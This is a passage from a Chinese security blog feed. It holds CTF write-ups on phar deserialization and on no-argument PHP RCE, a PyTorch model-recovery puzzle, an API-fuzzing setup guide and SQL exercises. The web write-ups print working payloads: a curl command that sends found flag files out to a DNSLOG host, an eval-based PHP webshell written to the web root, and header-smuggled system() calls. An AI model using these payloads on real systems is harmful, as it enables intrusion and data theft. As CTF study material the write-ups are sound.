class="hljs-string">&#x27;file&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>看到这个代码，就知道这个题要用 phar 去做了。</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>留意到了 unlink 这个方法和 flag 这个类，这个方法是可以触发 phar 的反序列化的，这里列举一下可以触发 phar反序列化 的方法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() <br><br>file_put_contents() file_get_contents() <br><br>file_exists() fileinode() include() <br>require() include_once require_once() <br><br>filemtime() fileowner() fileperms() <br>filesize() is_dir() scandir() rmdir() <br><br>highlight_file()<br><br>还有一个类：<br>new DirectoryIteartor() <br></code></pre></td></tr></table></figure><p>基本思路就是通过post 上传 phar 文件，然后触发 unlink 反序列化，在 Flag 类中触发exec($this-&gt;cmd); 实现 RCE。</p><p>phar 文件的构成：</p><p><img src="/2023/10/29/newstarctf2023-pharone/1.jpg"></p><p>在 phar 文件中的.metadata中可以写入 php 语句，当执行 phar:&#x2F;&#x2F;文件名 去读取该 phar 文件时，上述讲到的方法就会检查.metadata是否存在，如果存在，就触发反序列化。</p><p>先写一段 php 代码用于生成 phar 文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;sleep 5&quot;</span>; <span class="hljs-comment">#判断无回显是否成功执行</span><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">#触发 unlink</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">#生成 phar 文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment">#设置 phar 文件头，这里用 GIF89a 做文件头欺骗，防止有文件头检查</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">#设置内容，这里会签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">#随便写点 txt，让他通过检查</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>写完后改后缀为.gif，通过文件上传页面上传该 phar 文件，结果上传不上去，发现是他对内容做了检查，检查了 phar 的文件头：__HALT_COMPILER();</p><p>这里需要绕过检查，使用 linux 的gzip压缩 phar 文件来绕过检查，除了 gzip 以外，将Phar压缩成<strong>tar、bzip2</strong>后均能够触发反序列化，大致原理就是在执行phar:&#x2F;&#x2F;文件时，会判断这个文件是不是标准的 phar 文件，在判断过程中对 zip，gz，bz 这三种压缩形式的幻数做了处理，分别调用了他们对应的decompress过滤器做解压缩处理。</p><p>我们这里将生成的 phar 文件拖到 kali 用 gzip 进行压缩，然后上传，改后缀上传，文件名为：a.gif，发现成功上传，然后构造 payload：<br>file&#x3D;phar:&#x2F;&#x2F;uploads&#x2F;改名后的文件，发现空了 5 秒，成功rce。</p><p>这里另外一个难点就是无回显 RCE，本人当时一直弹不动 shell，所以就写了一个 DNSLOG 外带，具体指令为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">curl http://9esedf.ceye.io/`cat $(find / -name flag*)`<br></code></pre></td></tr></table></figure><p>这里的 <a href="http://9esedf.ceye.io/">http://9esedf.ceye.io/</a> 是 dnslog 网站( <a href="http://ceye.io/">http://ceye.io</a> )分配给我的域名。这里注意 dnslog 外带只能带一个参数出来，所以如果你用 ls 只能获得到 ls 的第一个参数。之后用 find 指令去找 flag，然后带出来，获得 flag，结果如下：</p><p><img src="/2023/10/29/newstarctf2023-pharone/2.jpg"></p><h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解上说：</p><p>“Web根目录可写，可以直接写一个WebShell进去”</p><p>构造 cmd 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br></code></pre></td></tr></table></figure><p>然后 getshell，确实没有往这方面想，是我想复杂了，学到了 QAQ</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网信中山】Pytorch 神经网络复原</title>
    <link href="/2023/10/29/%E7%BD%91%E4%BF%A1%E4%B8%AD%E5%B1%B1-AI-%E9%A2%98/"/>
    <url>/2023/10/29/%E7%BD%91%E4%BF%A1%E4%B8%AD%E5%B1%B1-AI-%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="【网信中山】Misc-Pytorch-神经网络复原"><a href="#【网信中山】Misc-Pytorch-神经网络复原" class="headerlink" title="【网信中山】Misc Pytorch 神经网络复原"></a>【网信中山】Misc Pytorch 神经网络复原</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>中山杯打到后期，放出了一道 misc 题，下载附件拿到一个压缩包。解压获得了如下文件：</p><ul><li>.npy 文件 : 用于存储 numpy 数组</li><li>label.json 文件 : 用于存储模型标签</li><li>MyLeNet.pt 文件 :  PyTorch 的序列化文件格式，用于保存和加载 PyTorch 模型的参数和状态。这种格式方便用户在训练过程中保存检查点，以及在后续的推理或继续训练过程中加载模型。</li></ul><h2 id="思考过程"><a href="#思考过程" class="headerlink" title="思考过程"></a>思考过程</h2><p>在这里思路其实很明显： 先根据 pt 文件复原模型，然后将 npy 文件全部喂给模型，得到的输出根据 label.json文件做标签分类，然后再拼接获得flag。</p><p>这里最难的就是模型的复原，完全不知道他使用的哪个非线性方法，我试了很久也没试出来，跑出来的结果对称性非常强，一度让我以为是还要解码，最后遗憾告终，对这类题还是太陌生了。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>比赛结束后看了唯一做出来的那队的 WP，才发现居然要逆MyLeNet.pt文件，直接把 MyLeNet 文件放到 CyberChef 里，看内容，发现里面有 sigmoid 和 relu 非线性方法，由于只有两种非线性方法，一共四个层，做一个排列组合就能够拿到 flag 了，</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># 定义模型结构，与提供的 MyLeNet.pt 结构匹配</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLeNet</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MyLeNet, self).__init__()<br>        self.conv1 = nn.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, kernel_size=(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>), stride=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>        self.conv2 = nn.Conv2d(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, kernel_size=(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>), stride=(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>        self.fc1 = nn.Linear(<span class="hljs-number">256</span>, <span class="hljs-number">120</span>)<br>        self.fc2 = nn.Linear(<span class="hljs-number">120</span>, <span class="hljs-number">84</span>)<br>        self.fc3 = nn.Linear(<span class="hljs-number">84</span>, <span class="hljs-number">62</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-comment"># 这个地方要排列组合去尝试</span><br>        x = torch.sigmoid(self.conv1(x))<br>        x = torch.max_pool2d(x, <span class="hljs-number">2</span>)<br>        x = torch.relu(self.conv2(x))<br>        x = torch.max_pool2d(x, <span class="hljs-number">2</span>)<br>        x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-number">256</span>)<br>        x = torch.sigmoid(self.fc1(x))<br>        x = torch.relu(self.fc2(x))<br>        x = self.fc3(x)<br>        <span class="hljs-keyword">return</span> x<br><br><span class="hljs-comment"># 加载模型参数</span><br>model = MyLeNet()<br>model.load_state_dict(torch.load(<span class="hljs-string">&#x27;MyLeNet.pt&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>)))<br>model.<span class="hljs-built_in">eval</span>()<br><span class="hljs-comment"># 定义一个空字符串用于拼接结果</span><br>predicted_string = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 加载标签映射</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;label.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    label_map = json.load(f)<br><br><span class="hljs-comment"># 加载并预测样本</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">56</span>):<br>    sample = np.load(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.npy&quot;</span>)<br>    sample = torch.tensor(sample, dtype=torch.float32).unsqueeze(<span class="hljs-number">0</span>).unsqueeze(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 添加 batch 和 channel 维度</span><br>    prediction = model(sample)<br>    predicted_label = torch.argmax(prediction, dim=<span class="hljs-number">1</span>).item()<br>    <br>    <span class="hljs-comment"># 根据标签映射找到预测的字符</span><br>    predicted_character = [char <span class="hljs-keyword">for</span> char, label <span class="hljs-keyword">in</span> label_map.items() <span class="hljs-keyword">if</span> label == predicted_label][<span class="hljs-number">0</span>]<br>    <br>    <span class="hljs-comment"># 将预测的字符添加到字符串中</span><br>    predicted_string += predicted_character<br><br><span class="hljs-comment"># 打印拼接后的完整字符串</span><br><span class="hljs-built_in">print</span>(predicted_string)<br></code></pre></td></tr></table></figure><p>然后试的话发现其中 sigmoid+relu+sigmoid+relu 这个组合的结果为:</p><pre><code class="hljs">ZmxhZ3thNzkzZjI1Ny01Nzg4LWYwZjYtY2E5Zi00YTgyZWE3MmUwYzZ9</code></pre><p>眼熟的 base64，拿去 base64 解码即可获得 flag：</p><p>flag{a793f257-5788-f0f6-ca9f-4a82ea72e0c6}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【newstarctf2023】 无参数 rce</title>
    <link href="/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/"/>
    <url>/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/</url>
    
    <content type="html"><![CDATA[<h1 id="【newstarctf】-R-C-E-无参数-RCE"><a href="#【newstarctf】-R-C-E-无参数-RCE" class="headerlink" title="【newstarctf】 R!!C!!E!!  无参数 RCE"></a>【newstarctf】 R!!C!!E!!  无参数 RCE</h1><p>打开靶机，提示我们再找信息，dirsearch一下发现有 git 泄露，url请求该 path 拿到 git 文件，放到 cyberchef 里解密看到有其他的 php 文件，打开后看到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123; <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]))&#123; <br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]); <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>很明显是一道 RCE 题，这边要绕正则，第一个正则是</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;star&#x27;</span>])</span></span><br></code></pre></td></tr></table></figure><p>这是一个很经典的无参正则，他可以匹配</p><ul><li>func();</li><li>func(func2());</li><li>func(func2(func3()));</li><li>func1(func2($_POST[a]));  这个自己发现的，没准什么时候能用上</li></ul><p>然后就导致后面 preg＿match 不能绕过，只能选 preg＿match 过滤以外的无参数 RCE。</p><p>注意到这里没有限制getallheaders(),getallheaders()是一个无参获取所有请求头内容的函数，返回请求头数组，然后 next 也没有禁用，经检查发现他没有验证请求头完整性，我们就删掉其他参数只剩下 next 能检测到的参数就能从 header 获取 RCE 内容了。</p><p>故构造 payload 为：</p><pre><code class="hljs">?star=eval(next(getallheaders()));</code></pre><p>请求头里将Cache-Control字段的值改为：</p><pre><code class="hljs">system(&#39;cat /f*&#39;);</code></pre><p>即可获取 flag</p><p><img src="/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/result.jpg"></p><p>官方题解构造的 payload 是：</p><pre><code class="hljs">?star=eval(pos(array_reverse(getallheaders())));</code></pre><p>她们的思路是反转 header 数组再定位当前元素获取命令，命令放在请求头数组最后的元素上。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>API FUZZING流程说明</title>
    <link href="/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/"/>
    <url>/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="REST-API-FUZZING-实验流程"><a href="#REST-API-FUZZING-实验流程" class="headerlink" title="REST API FUZZING 实验流程"></a>REST API FUZZING 实验流程</h1><p>我的设备：<br>windows11 + 谷歌pixel + 安卓9<br>环境：<br>adb + AppUIAutomator + mitmproxy</p><h2 id="adb调试"><a href="#adb调试" class="headerlink" title="adb调试"></a>adb调试</h2><p>建议有线连接，不用频繁的debug而且数据传输快，USB连接之后：</p><pre><code class="hljs">adb dedvices       #查看当前连接的adb设备</code></pre><h2 id="mitm抓包部分"><a href="#mitm抓包部分" class="headerlink" title="mitm抓包部分"></a>mitm抓包部分</h2><ol><li>如果使用校园网抓包，要在电脑打开<strong>移动热点</strong>，确保手机和电脑在一个网段内，才能成功抓包。</li><li>连上热点后，电脑输入ipconfig，获取<strong>WLAN的ipv4</strong>地址</li><li>打开手机，在wifi那里配置代理，ip地址输入上一步抓到的，端口号默认为8080。</li></ol><h2 id="adb-获取APK包名"><a href="#adb-获取APK包名" class="headerlink" title="adb 获取APK包名"></a>adb 获取APK包名</h2><p>可以使用adb来为手机安装APK：</p><pre><code class="hljs">adb install -d xxx.apk</code></pre><p>安装完成后，打开该apk，然后运行：</p><pre><code class="hljs">adb shell dumpsys window | findstr mCurrentFocus</code></pre><p>获取手机当前正在运行activity的包名，包名为从左到右数<strong>第一个com开头的字段</strong>：<br><img src="/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/1.jpg"><br>上图中包名为<strong>com.wuba</strong></p><h2 id="AppUIAutomator"><a href="#AppUIAutomator" class="headerlink" title="AppUIAutomator"></a>AppUIAutomator</h2><p>AppUIAutomator在使用前，要把所有要运行的app的<strong>包名</strong>放在根目录的<strong>apk_pkgName.txt</strong>文件中，格式为 包名 | APK名字，如：</p><pre><code class="hljs">com.wuba | 58同城</code></pre><p>放好后在当前文件夹打开终端，输入：</p><pre><code class="hljs">Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass   #开放权限，windows必做python test_integrate.py    #运行</code></pre><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>在script.py文件夹打开终端，直接运行：</p><pre><code class="hljs">mitmdump -s script_json.py</code></pre><p>如果没抓到包可能有以下情况：</p><ol><li>不在一个网段</li><li>证书没配置好</li><li>代理的ip地址或端口号不对</li></ol><h2 id="对比脚本部分"><a href="#对比脚本部分" class="headerlink" title="对比脚本部分"></a>对比脚本部分</h2><p>为了方便，统一将对比的两个文件命名为 a.json 和 b.json，然后直接在compare.py所在文件夹打开终端，执行：</p><pre><code class="hljs">python compare.py</code></pre><p>即可，会在当前目录下生成三个文件：</p><ol><li>cleaned_a.json 代表a用户筛选出的键值发生变化的API，里面包括域名+完整path+键名+键值</li><li>cleaned_b.json 同上，代表b用户</li><li>keywords.json，关键词的整合，包括域名+部分path+键名</li></ol>]]></content>
    
    
    <categories>
      
      <category>科研</category>
      
      <category>API FUZZING</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>中级 SQL 语句</title>
    <link href="/2023/10/12/%E4%B8%AD%E7%BA%A7-SQL-%E8%AF%AD%E5%8F%A5/"/>
    <url>/2023/10/12/%E4%B8%AD%E7%BA%A7-SQL-%E8%AF%AD%E5%8F%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="常用的-SQL-命令"><a href="#常用的-SQL-命令" class="headerlink" title="常用的 SQL 命令"></a>常用的 SQL 命令</h2><p>基本思路：</p><p>JOIN 做 关联查询，WHERE 做条件限制，函数做计算。</p><p>查询每个部门的平均年龄</p><p>使用 AVG 函数来求均值，JOIN 表加条件，GROUP BY 来按部门展示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> 部门信息.部门编号,部门信息.部门名称,<br>    <span class="hljs-built_in">AVG</span>(员工信息.年龄) <span class="hljs-keyword">AS</span> 平均年龄<br><span class="hljs-keyword">FROM</span> <br>    员工信息<br><span class="hljs-keyword">JOIN</span><br>    部门信息 <span class="hljs-keyword">ON</span> 员工信息.所在部门 <span class="hljs-operator">=</span> 部门信息.部门编号<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span><br>    部门信息.部门编号, 部门信息.部门名称;<br></code></pre></td></tr></table></figure><p>mitmproxy</p><p>查询和李文萌不在一个部门的员工</p><p>展示除了特定值以外数据，使用    ！&#x3D;    来限制，先在部门表将和李文萌不在一个部门的员工给选择出来，再通过关联查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> 员工姓名<br><span class="hljs-keyword">FROM</span> 员工信息<br><span class="hljs-keyword">WHERE</span> 所在部门 <span class="hljs-operator">!=</span> (<br>    <span class="hljs-keyword">SELECT</span> 所在部门<br>    <span class="hljs-keyword">FROM</span> 员工信息<br>    <span class="hljs-keyword">WHERE</span> 员工姓名 <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;李文萌&#x27;</span><br>)<br><span class="hljs-keyword">AND</span> 员工姓名 <span class="hljs-operator">!=</span> <span class="hljs-string">&#x27;李文萌&#x27;</span>;<br></code></pre></td></tr></table></figure><p>查询每个员工的工号，姓名，所在部门名称，以及其部门领导姓名</p><p>用自连接查询，像加入其他表一样加入自己的也是可以的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span><br>    e.员工工号,<br>    e.员工姓名,<br>    d.部门名称,<br>    l.员工姓名 <span class="hljs-keyword">AS</span> 部门领导姓名<br><span class="hljs-keyword">FROM</span> 员工信息 <span class="hljs-keyword">AS</span> e<br><span class="hljs-keyword">JOIN</span> 部门信息 <span class="hljs-keyword">AS</span> d <span class="hljs-keyword">ON</span> e.所在部门 <span class="hljs-operator">=</span> d.部门编号<br><span class="hljs-keyword">JOIN</span> 员工信息 <span class="hljs-keyword">AS</span> l <span class="hljs-keyword">ON</span> d.部门领导工号 <span class="hljs-operator">=</span> l.员工工号;<br></code></pre></td></tr></table></figure><p>找出哪个部门没有员工？</p><p>用 IS NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> d.部门编号, d.部门名称<br><span class="hljs-keyword">FROM</span> 部门信息 <span class="hljs-keyword">AS</span> d<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> 员工信息 <span class="hljs-keyword">AS</span> e <span class="hljs-keyword">ON</span> d.部门编号 <span class="hljs-operator">=</span> e.所在部门<br><span class="hljs-keyword">WHERE</span> e.员工工号 <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>;<br></code></pre></td></tr></table></figure><p>查询在第5学期选修了“数据库系统原理”和“软件工程导论”这两门课程的学生学号、学生姓名、所在专业名称。</p><p>这里用 AND 链接做条件限制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> s.student_id, s.student_name, m.major_name<br><span class="hljs-keyword">FROM</span> students_info s<br><span class="hljs-keyword">JOIN</span> grades_info g1 <span class="hljs-keyword">ON</span> s.student_id <span class="hljs-operator">=</span> g1.student_id<br><span class="hljs-keyword">JOIN</span> grades_info g2 <span class="hljs-keyword">ON</span> s.student_id <span class="hljs-operator">=</span> g2.student_id<br><span class="hljs-keyword">JOIN</span> courses_info c1 <span class="hljs-keyword">ON</span> g1.course_id <span class="hljs-operator">=</span> c1.course_id<br><span class="hljs-keyword">JOIN</span> courses_info c2 <span class="hljs-keyword">ON</span> g2.course_id <span class="hljs-operator">=</span> c2.course_id<br><span class="hljs-keyword">JOIN</span> major_info m <span class="hljs-keyword">ON</span> s.major_id <span class="hljs-operator">=</span> m.major_id<br><span class="hljs-keyword">WHERE</span> c1.course_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;数据库原理&#x27;</span> <span class="hljs-keyword">AND</span> c1.course_term <span class="hljs-operator">=</span> <span class="hljs-number">5</span><br><span class="hljs-keyword">AND</span> c2.course_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;软件工程&#x27;</span> <span class="hljs-keyword">AND</span> c2.course_term <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>查询在选修了“数据库系统原理”和“软件工程导论”这两门课程的学生学号、学生姓名、以及各科课程的成绩。</p><p>如何拆解，首先我们先考虑条件：“选修了“数据库系统原理”和“软件工程导论”这两门课程的学生”，先用 WHERE 语句按照条件查询出来，然后再去 JOIN 其他表展示剩下的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <br>    s.student_id, <br>    s.student_name,<br>    c.course_name,<br>    g.grades<br><span class="hljs-keyword">FROM</span> students_info s<br><span class="hljs-keyword">JOIN</span> grades_info g <span class="hljs-keyword">ON</span> s.student_id <span class="hljs-operator">=</span> g.student_id<br><span class="hljs-keyword">JOIN</span> courses_info c <span class="hljs-keyword">ON</span> g.course_id <span class="hljs-operator">=</span> c.course_id<br><span class="hljs-keyword">WHERE</span> s.student_id <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> student_id<br>    <span class="hljs-keyword">FROM</span> grades_info<br>    <span class="hljs-keyword">JOIN</span> courses_info <span class="hljs-keyword">ON</span> grades_info.course_id <span class="hljs-operator">=</span> courses_info.course_id<br>    <span class="hljs-keyword">WHERE</span> course_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;数据库原理&#x27;</span><br>) <span class="hljs-keyword">AND</span> s.student_id <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> student_id<br>    <span class="hljs-keyword">FROM</span> grades_info<br>    <span class="hljs-keyword">JOIN</span> courses_info <span class="hljs-keyword">ON</span> grades_info.course_id <span class="hljs-operator">=</span> courses_info.course_id<br>    <span class="hljs-keyword">WHERE</span> course_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;软件工程&#x27;</span><br>);<br></code></pre></td></tr></table></figure><p>求出每门课的课程号、选课人数。</p><p>用 COUNT 去统计，这里使用左链接显示没有人选的科目</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <br>    c.course_id,<br>    c.course_name,<br>    <span class="hljs-built_in">COUNT</span>(g.student_id) <span class="hljs-keyword">AS</span> number_of_students<br><span class="hljs-keyword">FROM</span> courses_info c<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> grades_info g <span 